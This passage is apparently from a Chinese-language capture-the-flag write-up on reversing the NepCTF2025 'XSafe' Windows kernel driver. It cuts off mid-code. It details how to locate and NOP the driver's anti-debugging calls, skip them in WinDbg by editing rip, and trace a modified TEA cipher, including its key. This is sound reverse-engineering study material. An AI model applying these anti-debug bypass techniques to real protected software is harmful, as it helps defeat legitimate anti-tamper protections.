ffffc78e`be809290 ffffc78e`be765e50 : XSafe_____!malloc+0x143dcf</span><br><span class="line">0a fffff803`4e35fc30     : ffffc78e`be4ff000 00000000`00000000 ffffc78e`be765e50 00000000`00000000 : XSafe_____!malloc+0x143e80</span><br><span class="line">0b fffff803`4e36fd0d     : 00000000`00000016 00000000`00000000 00000000`00000000 00000000`00001000 : nt!PnpCallDriverEntry+0x4c</span><br><span class="line">0c fffff803`4e382a87     : 00000000`00000000 00000000`00000000 fffff803`4e925440 ffffc78e`bea2d6c0 : nt!IopLoadDriver+0x4e5</span><br><span class="line">0d fffff803`4de22525     : ffffc78e`00000000 ffffffff`80002598 ffffc78e`be9e8040 00000000`00000000 : nt!IopLoadUnloadDriver+0x57</span><br><span class="line">0e fffff803`4df29935     : ffffc78e`be9e8040 00000000`00000080 ffffc78e`b846a040 000fa47f`b19bbdff : nt!ExpWorkerThread+0x105</span><br><span class="line">0f fffff803`4e006e08     : ffff8001`1f5a8180 ffffc78e`be9e8040 fffff803`4df298e0 00000000`00000000 : nt!PspSystemThreadStartup+0x55</span><br><span class="line">10 00000000`00000000     : ffffec83`b4fb2000 ffffec83`b4fac000 00000000`00000000 00000000`00000000 : nt!KiStartSystemThread+0x28</span><br></pre></td></tr></table></figure><p>03行的返回地址<code>fffff803`4cab6f5c</code>就是驱动中调用KeBugCheckEx的地方。</p><p>下图，返回地址的上一行call，即为KeBugCheckEx的调用Call，IDA加载驱动，搜索这边汇编对应的硬编码字节定位到Call，然后Nop即可过这种反调试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fffff803`4cab6f56 ff158cfd1300         call    qword ptr [0FFFFF8034CBF6CE8h]</span><br><span class="line">fffff803`4cab6f5c 4989cb               mov     r11, rcx</span><br></pre></td></tr></table></figure><p><img src="/2025/07/31/NepCTF2025-XSafe/image-4.png" alt="alt text"></p><p>过了这个反调试，发现调试器被剥离了，大概是调用了KdDisableDebugger禁用了内核调试器。</p><p>我们发现调用KeBugCheckEx的<code>call    qword ptr [0FFFFF8034CBF6CE8h]</code>在许多api调用的时候都用到。</p><p>获取到0FFFFF8034CBF6CE8h地址的值跳转过去，可以发现是jmp rax，说明这个就是全局所有调用API都共用的代码，只需要断点这边，查看rax地址就能知道调用了什么API。</p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-5.png" alt="alt text"></p><p>输入”sxe ld XSafe”，设置断点在驱动入口，加载驱动。</p><p>然后输入”.reload”重新加载符号，再输入”bp nt!KeBugCheckEx”断在KeBugCheckEx。</p><p>运行断住，找到ret的地方，直接输入”rrip&#x3D;ret地址”，跳到ret处，就可以绕过执行。</p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-6.png" alt="alt text"></p><p>单步ret回去，得到call的地址，然后断点在这个jmp rax上。</p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-7.png" alt="alt text"></p><p>运行发现调用了KdDisableDebugger，同上面一样修改rip到ret跳过执行，执行到返回就可以找到调用方。</p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-8.png" alt="alt text"></p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-10.png" alt="alt text"></p><p>发现还会调用两次KeIpiGenericCall，同上，跳过执行，然后执行返回找到调用方。</p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-9.png" alt="alt text"></p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-11.png" alt="alt text"></p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-12.png" alt="alt text"></p><p>综上，可以得到以下四处反调试调用方，IDA加载驱动，搜索每处地方的硬编码字节，全部把<code>call    qword ptr [0FFFFF803E5476CE8h]</code>这一行nop了，即可过全部反调试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">call KeBugCheckEx:</span><br><span class="line">fffff803`4cab6f56 ff158cfd1300         call    qword ptr [0FFFFF8034CBF6CE8h]</span><br><span class="line">fffff803`4cab6f5c 4989cb               mov     r11, rcx</span><br><span class="line"></span><br><span class="line">call KdDisableDebugger:</span><br><span class="line">fffff803`e53350fc ff15e61b1400   call    qword ptr [0FFFFF803E5476CE8h]</span><br><span class="line">fffff803`e5335102 e803000000     call    FFFFF803E533510A</span><br><span class="line"></span><br><span class="line">call KeIpiGenericCall:</span><br><span class="line">fffff803`e5336706 ff15dc051400           call    qword ptr [0FFFFF803E5476CE8h]</span><br><span class="line">fffff803`e533670c 48b9e2ba9a1b451d75f0   mov     rcx, 0F0751D451B9ABAE2h</span><br><span class="line"></span><br><span class="line">call KeIpiGenericCall:</span><br><span class="line">fffff803`e53367ff ff15e3041400         call    qword ptr [0FFFFF803E5476CE8h]</span><br><span class="line">fffff803`e5336805 4883c420             add     rsp, 20h</span><br></pre></td></tr></table></figure><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><h3 id="主流程"><a href="#主流程" class="headerlink" title="主流程"></a>主流程</h3><p>通过上面断点那个通用的jmp rax，然后运行查看rax地址，我们可以得到一条API调用链，可以看出是注册了回调，然后在回调里面获取当前进程名，然后判断。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">RtlInitUnicodeString</span><br><span class="line"></span><br><span class="line">// 注册回调</span><br><span class="line">ObRegisterCallbacks</span><br><span class="line"></span><br><span class="line">// 获取当前进程</span><br><span class="line">PsGetCurrentProcess</span><br><span class="line"></span><br><span class="line">// 获取当前进程名</span><br><span class="line">PsGetProcessImageFileName</span><br><span class="line"></span><br><span class="line">// 字符串判断</span><br><span class="line">strncmp</span><br></pre></td></tr></table></figure><p>调用到strncmp的时候看一下参数，可以看到一个是PsGetProcessImageFileName获取到的当前进程名，一个是目标进程名，那么应该就是判断当前回调的进程是不是xia0ji233.exe，也就那个R3程序。</p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-13.png" alt="alt text"></p><p>由于只要没有这个进程，之后的代码就不会执行，只能找到strncmp调用处，然后在他的下一行下一个条件断点，<code>bp fffff803`e5341304 &quot;.if(@eax!=0)&#123;gc&#125;&quot;</code>，让他在strncmp返回值eax&#x3D;&#x3D;0的时候断下，然后运行<code>xia0ji233.exe</code>，随便输入<code>1111222233334444</code>，然后调试器会断下。</p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-14.png" alt="alt text"></p><p>然后接下来又会有新的API通过jmp rax执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 获取进程段基地址</span><br><span class="line">PsGetProcessSectionBaseAddress</span><br><span class="line"></span><br><span class="line">ExAllocatePoolWithTag</span><br><span class="line"></span><br><span class="line">// 获取当前进程</span><br><span class="line">PsGetCurrentProcess</span><br><span class="line"></span><br><span class="line">// 复制虚拟内存</span><br><span class="line">MmCopyVirtualMemory</span><br><span class="line"></span><br><span class="line">// 字符串长度</span><br><span class="line">strlen</span><br></pre></td></tr></table></figure><p>断在MmCopyVirtualMemory的时候查看一下寄存器，发现rdx参数是r3内存，da命令查询发现就是我们程序种输入的字符串。</p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-15.png" alt="alt text"></p><p>Step Out执行到返回，然后rdi就是从r3复制字符串到r0的储存地址。</p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-16.png" alt="alt text"></p><p>strlen传入了输入的字符串，获取长度，大概是要判断长度是否符合。</p><p>断到strlen的时候Steg Out执行到返回，然后开始单步调试（F8），</p><p>执行到此处xor时，此时r8d就是我们输入字符串长度，eax是通过计算得到的一个值，eax为<code>0xCDB92702</code>，需要等于目标<code>0xCDB92732</code>，说明目标长度就是<code>0xCDB92732^0xCDB92702</code>，也就是48，所以flag输入长度为48.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fffff803`e533d86d 4431c0               xor     eax, r8d</span><br><span class="line">fffff803`e533d870 3d3227b9cd           cmp     eax, 0CDB92732h</span><br></pre></td></tr></table></figure><p>此时步过执行xor，然后将eax改成目标值，让他通过条件，开始之后的加密相关代码执行，因为我们只需要分析他的加密流程，输入长度多少无所谓。</p><h3 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h3><p>分析加密，这边从输入的数据入手，<code>ba r8 ffffd08f48d02a50</code>设置8字节硬件断点在输入的字符串地址，运行，会断在下面代码。</p><p>获取了第一个四字节到r11d和堆栈中，然后之后就是漫长的单步调试，观察主要的寄存器的变化，以及相关汇编代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fffff803`e533bf76 448b1a           mov     r11d, dword ptr [rdx]</span><br><span class="line">fffff803`e533bf79 4889542410       mov     qword ptr [rsp+10h], rdx</span><br><span class="line">fffff803`e533bf7e 7408             je      FFFFF803E533BF88</span><br><span class="line">fffff803`e533bf80 7506             jne     FFFFF803E533BF88</span><br></pre></td></tr></table></figure><p>初步获取前8个字节。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">获取第一个四字节到r11d</span><br><span class="line">fffff804`3964bf76 448b1a           mov     r11d, dword ptr [rdx]</span><br><span class="line">fffff804`3964bf79 4889542410       mov     qword ptr [rsp+10h], rdx</span><br><span class="line">fffff804`3964bf7e 7408             je      FFFFF8043964BF88</span><br><span class="line">fffff804`3964bf80 7506             jne     FFFFF8043964BF88</span><br><span class="line">fffff804`3964bf82 9c               pushfq  </span><br><span class="line"></span><br><span class="line">获取第二个四字节到r15d</span><br><span class="line">fffff804`3964bf88 c5f82ed0     vucomiss xmm2, xmm0</span><br><span class="line">fffff804`3964bf8c 448b7a04     mov     r15d, dword ptr [rdx+4]</span><br><span class="line">fffff804`3964bf90 0f2de5       cvtps2pi mm4, xmm5</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>中途会得到delta在寄存器中,<code>0x9e3779b9</code></p><p>以下是对两个四字节相关的运算，可以很简单的看出是一个Tea加密，并且密钥在动调过程中就可以拿到<code>&#123;0x3c4ed885 ,0x12af3e87 ,0xd6e1b31f ,0x25c10aa0&#125;</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">r11d-&gt;rdx = 0x33333333</span><br><span class="line">r15-&gt;r12 = 0x34343434</span><br><span class="line">r15-&gt;rcx = 0x34343434</span><br><span class="line">ecx &lt;&lt; 4 (0x34343434&lt;&lt;4 = 0x0000000043434340)</span><br><span class="line"></span><br><span class="line">fffff804`3964c2b3 4589fc               mov     r12d, r15d</span><br><span class="line">fffff804`3964c2b6 4489da               mov     edx, r11d</span><br><span class="line">fffff804`3964c2b9 4489f9               mov     ecx, r15d</span><br><span class="line">fffff804`3964c2bc c1e104               shl     ecx, 4</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">r15 &gt;&gt; 5 (0x34343434&gt;&gt;5 = 0x0000000001a1a1a1)</span><br><span class="line"></span><br><span class="line">fffff804`3964c2d1 41c1ef05             shr     r15d, 5</span><br><span class="line">fffff804`3964c2d5 7405                 je      FFFFF8043964C2DC</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">r15d = r15d ^ ecx = 0x0000000001a1a1a1^0x0000000043434340 = 0x0000000042e2e2e1</span><br><span class="line">r15d = r15d + r12d = 0x0000000042e2e2e1+0x34343434 = 0x0000000077171715</span><br><span class="line">esi-&gt;ecx(sum) = 0x0</span><br><span class="line">ecx = ecx&amp;3 = 0</span><br><span class="line">[r8+rcx*4] -&gt; r11d = 0x000000003c4ed885</span><br><span class="line">r8为key</span><br><span class="line">1: kd&gt; dd r8</span><br><span class="line">ffff8184`efd2a090  3c4ed885 12af3e87 d6e1b31f 25c10aa0</span><br><span class="line">r11d = r11d + esi = (key[0]+sum) = 0x000000003c4ed885</span><br><span class="line"></span><br><span class="line">fffff804`3964c2dc 4131cf               xor     r15d, ecx</span><br><span class="line">fffff804`3964c2df 4501e7               add     r15d, r12d</span><br><span class="line">fffff804`3964c2e2 89f1                 mov     ecx, esi</span><br><span class="line">fffff804`3964c2e4 83e103               and     ecx, 3</span><br><span class="line">fffff804`3964c2e7 458b1c88             mov     r11d, dword ptr [r8+rcx*4]</span><br><span class="line">fffff804`3964c2eb 4101f3               add     r11d, esi</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">r15d-&gt;ecx=0x0000000077171715</span><br><span class="line">ecx = ecx ^ 9F377865h = 0x00000000e8206f70</span><br><span class="line">r15d = r15d ^ 60C8879Ah = 0x0000000017df908f</span><br><span class="line">fffff804`3964c306 4489f9         mov     ecx, r15d</span><br><span class="line">fffff804`3964c309 81f16578379f   xor     ecx, 9F377865h</span><br><span class="line">fffff804`3964c30f 4181f79a87c860 xor     r15d, 60C8879Ah</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">r11d -&gt; r13d = 0x000000003c4ed885</span><br><span class="line">r13d = r13d ^ 981F18CDh = 0x00000000a451c048</span><br><span class="line">fffff804`3964c32a 4589dd         mov     r13d, r11d</span><br><span class="line">fffff804`3964c32d 4181f5cd181f98 xor     r13d, 981F18CDh</span><br><span class="line">fffff804`3964c334 4151           push    r9</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">r13d = r13d &amp; r15d = 0x00000000a451c048 &amp; 0x0000000017df908f = 0x0000000004518008</span><br><span class="line">r11d = r11d ^ 67E0E732h = 0x000000003c4ed885 ^ 67E0E732h = 0x000000005bae3fb7</span><br><span class="line">r11d = r11d &amp; ecx = 0x000000005bae3fb7 &amp; 0x00000000e8206f70 = 0x0000000048202f30</span><br><span class="line">r11d = r11d ^ r13d = 0x0000000048202f30 ^ 0x0000000004518008 = 0x000000004c71af38</span><br><span class="line">r11d = r11d ^ 72860A8h = 0x000000004c71af38 ^ 72860A8h = 0x000000004b59cf90</span><br><span class="line">【上面计算可以简化总结为 r11d = r11d ^ r15d = 0x000000003c4ed885 ^ 0x0000000077171715 = 0x000000004b59cf90】</span><br><span class="line">r11d = r11d + edx = 0x000000004b59cf90 + 0x0000000033333333 = 0x000000007e8d02c3</span><br><span class="line">rsi = rsi + r10d = 0 + 0x000000009e3779b9 = sum + delta = 0x000000009e3779b9</span><br><span class="line">r11d -&gt; ecx = 0x000000007e8d02c3</span><br><span class="line"></span><br><span class="line">fffff804`3964c348 4521fd         and     r13d, r15d</span><br><span class="line">fffff804`3964c34b 4181f332e7e067 xor     r11d, 67E0E732h</span><br><span class="line">fffff804`3964c352 4121cb         and     r11d, ecx</span><br><span class="line">fffff804`3964c355 c4431540d7ee   vdpps   ymm10, ymm13, ymm15, 0EEh</span><br><span class="line">fffff804`3964c35b 4531eb         xor     r11d, r13d</span><br><span class="line">fffff804`3964c35e c44165d8d7     vpsubusb ymm10, ymm3, ymm15</span><br><span class="line">fffff804`3964c363 4181f3a8602807 xor     r11d, 72860A8h</span><br><span class="line">fffff804`3964c36a 4101d3         add     r11d, edx</span><br><span class="line">fffff804`3964c36d c4c17e70ce22   vpshufhw ymm1, ymm14, 22h</span><br><span class="line">fffff804`3964c373 4401d6         add     esi, r10d</span><br><span class="line">fffff804`3964c376 c5fd70c703     vpshufd ymm0, ymm7, 3</span><br><span class="line">fffff804`3964c37b 4489d9         mov     ecx, r11d</span><br><span class="line">fffff804`3964c37e e802000000     call    FFFFF8043964C385</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">ecx = ecx &lt;&lt; 4 = 0x000000007e8d02c3 &lt;&lt; 4 = 0x00000000e8d02c30</span><br><span class="line">r11d -&gt; edx = 0x000000007e8d02c3</span><br><span class="line">edx = edx &gt;&gt; 5 = 0x000000007e8d02c3 &gt;&gt; 5 = 0x0000000003f46816</span><br><span class="line"></span><br><span class="line">fffff804`3964c395 c1e104         shl     ecx, 4</span><br><span class="line">fffff804`3964c398 c57e7ffe       vmovdqu ymm6, ymm15</span><br><span class="line">fffff804`3964c39c 4489da         mov     edx, r11d</span><br><span class="line">fffff804`3964c39f c4627d1cda     vpabsb  ymm11, ymm2</span><br><span class="line">fffff804`3964c3a4 c1ea05         shr     edx, 5</span><br><span class="line">fffff804`3964c3a7 50             push    rax</span><br><span class="line">fffff804`3964c3a8 e801000000     call    FFFFF8043964C3AE</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">edx = edx ^ ecx = 0x0000000003f46816 ^ 0x00000000e8d02c30 = 0x00000000eb244426</span><br><span class="line">edx = edx + r11d = 0x00000000eb244426 + 0x000000007e8d02c3 = 0x0000000069b146e9</span><br><span class="line">esi -&gt; ecx = 0x000000009e3779b9(sum)</span><br><span class="line">ecx = ecx &gt;&gt; 9 = 0x000000009e3779b9 &gt;&gt; 9 = 0x00000000004f1bbc</span><br><span class="line">ecx = ecx &amp; 0xC = 0x00000000004f1bbc &amp; 0xC = 0x000000000000000c</span><br><span class="line"></span><br><span class="line">fffff804`3964c3c4 31ca           xor     edx, ecx</span><br><span class="line">fffff804`3964c3c6 4401da         add     edx, r11d</span><br><span class="line">fffff804`3964c3c9 89f1           mov     ecx, esi</span><br><span class="line">fffff804`3964c3cb 0f55e1         andnps  xmm4, xmm1</span><br><span class="line">fffff804`3964c3ce c1e909         shr     ecx, 9</span><br><span class="line">fffff804`3964c3d1 c57d28d4       vmovapd ymm10, ymm4</span><br><span class="line">fffff804`3964c3d5 83e10c         and     ecx, 0Ch</span><br><span class="line">fffff804`3964c3d8 c4434540d552   vdpps   ymm10, ymm7, ymm13, 52h</span><br><span class="line">fffff804`3964c3de e91a000000     jmp     FFFFF8043964C3FD</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">[r8+rcx] -&gt; r15d = 0x0000000025c10aa0</span><br><span class="line">r15d = r15d + esi(sum) = 0x0000000025c10aa0 + 0x000000009e3779b9 = 0x00000000c3f88459</span><br><span class="line"></span><br><span class="line">fffff804`3964c402 458b3c08       mov     r15d, dword ptr [r8+rcx]</span><br><span class="line">fffff804`3964c406 c442053dcb     vpmaxsd ymm9, ymm15, ymm11</span><br><span class="line">fffff804`3964c40b 4101f7         add     r15d, esi</span><br><span class="line">fffff804`3964c40e c4c17e70ea21   vpshufhw ymm5, ymm10, 21h</span><br><span class="line">fffff804`3964c414 e805000000     call    FFFFF8043964C41E</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">edx -&gt; ecx = 0x0000000069b146e9</span><br><span class="line">ecx = ecx ^ 0B49FE5F4h = 0x0000000069b146e9 ^ 0B49FE5F4h = 0x00000000dd2ea31d</span><br><span class="line">edx = edx ^ 4B601A0Bh = 0x0000000069b146e9 ^ 4B601A0Bh = 0x0000000022d15ce2</span><br><span class="line">r15d -&gt; r13d = 0x00000000c3f88459</span><br><span class="line">r13d = r13d ^ 0A8760961h = 0x000000006b8e8d38</span><br><span class="line">r13d = r13d &amp; edx = 0x000000006b8e8d38 &amp; 0x0000000022d15ce2 = 0x0000000022800c20</span><br><span class="line">r15d = r15d ^ 5789F69Eh = 0x00000000c3f88459 ^ 5789F69Eh = 0x00000000947172c7</span><br><span class="line"></span><br><span class="line">fffff804`3964c431 89d1                 mov     ecx, edx</span><br><span class="line">fffff804`3964c433 81f1f4e59fb4         xor     ecx, 0B49FE5F4h</span><br><span class="line">fffff804`3964c439 c4427d1def           vpabsw  ymm13, ymm15</span><br><span class="line">fffff804`3964c43e 81f20b1a604b         xor     edx, 4B601A0Bh</span><br><span class="line">fffff804`3964c444 d8ec                 fsubr   st, st(4)</span><br><span class="line">fffff804`3964c446 4589fd               mov     r13d, r15d</span><br><span class="line">fffff804`3964c449 d8cd                 fmul    st, st(5)</span><br><span class="line">fffff804`3964c44b 4181f5610976a8       xor     r13d, 0A8760961h</span><br><span class="line">fffff804`3964c452 4121d5               and     r13d, edx</span><br><span class="line">fffff804`3964c455 4181f79ef68957       xor     r15d, 5789F69Eh</span><br><span class="line">fffff804`3964c45c e801000000           call    FFFFF8043964C462</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">r15d = r15d &amp; ecx = 0x00000000947172c7 &amp; 0x00000000dd2ea31d = 0x0000000094202205</span><br><span class="line"></span><br><span class="line">fffff804`3964c475 4121cf               and     r15d, ecx</span><br><span class="line">fffff804`3964c478 e801000000           call    FFFFF8043964C47E</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">r15d = r15d ^ r13d = 0x0000000094202205 ^ 0x0000000022800c20 = 0x00000000b6a02e25</span><br><span class="line">r15d = r15d ^ 1CE9EC95h = 0x00000000b6a02e25 ^ 1CE9EC95h = 0x00000000aa49c2b0</span><br><span class="line">【上面计算可以简化总结为r15d = r15d ^ edx = 0x00000000c3f88459 ^ 0x0000000069b146e9 = 0x00000000aa49c2b0】</span><br><span class="line">r15d = r15d + r12d = 0x00000000aa49c2b0 + 0x34343434 = 0x00000000de7df6e4</span><br><span class="line"></span><br><span class="line">fffff804`3964c493 4531ef               xor     r15d, r13d</span><br><span class="line">fffff804`3964c496 4181f795ece91c       xor     r15d, 1CE9EC95h</span><br><span class="line">fffff804`3964c49d 4501e7               add     r15d, r12d</span><br><span class="line">fffff804`3964c4a0 48b9b07050452eff9123 mov     rcx, 2391FF2E455070B0h</span><br><span class="line">fffff804`3964c4aa 48b9abb442f15bbb4da8 mov     rcx, 0A84DBB5BF142B4ABh</span><br><span class="line">fffff804`3964c4b4 4831c9               xor     rcx, rcx</span><br><span class="line">fffff804`3964c4b7 75db                 jne     FFFFF8043964C494</span><br><span class="line">fffff804`3964c4b9 eb0d                 jmp     FFFFF8043964C4C8</span><br><span class="line">===================</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行完上面所有计算代码，再直接运行，会再次因为原字符串被访问而断住，这两边就是将加密结果储存到原字符串内存中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">计算完的第一个四字节存到原字符串指针 0x9a11c776 </span><br><span class="line">fffff804`3964d434 58                   pop     rax</span><br><span class="line">fffff804`3964d435 58                   pop     rax</span><br><span class="line">fffff804`3964d436 448918               mov     dword ptr [rax], r11d</span><br><span class="line">fffff804`3964d439 e800000000           call    FFFFF8043964D43E</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">计算完的第二个四字节存到原字符串指针 0xcd465e46</span><br><span class="line">fffff804`3964d463 44897804             mov     dword ptr [rax+4], r15d</span><br><span class="line">fffff804`3964d467 740b                 je      FFFFF8043964D474</span><br><span class="line">fffff804`3964d469 7509                 jne     FFFFF8043964D474</span><br><span class="line">===================</span><br></pre></td></tr></table></figure><p>将以上计算过程转为C代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(DWORD *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD Key[]&#123;<span class="number">0x3c4ed885</span>, <span class="number">0x12af3e87</span>, <span class="number">0xd6e1b31f</span>, <span class="number">0x25c10aa0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    DWORD Delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line"></span><br><span class="line">    DWORD d1&#123;&#125;, d2&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    d1 = data[<span class="number">0</span>];</span><br><span class="line">    d2 = data[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    DWORD Sum&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD tmp1&#123;&#125;, tmp2&#123;&#125;, tmp3&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        tmp1 = ((d2 &lt;&lt; <span class="number">4</span>) ^ (d2 &gt;&gt; <span class="number">5</span>)) + d2;</span><br><span class="line">        tmp2 = Key[Sum &amp; <span class="number">3</span>] + Sum;</span><br><span class="line">        tmp3 = tmp1 ^ 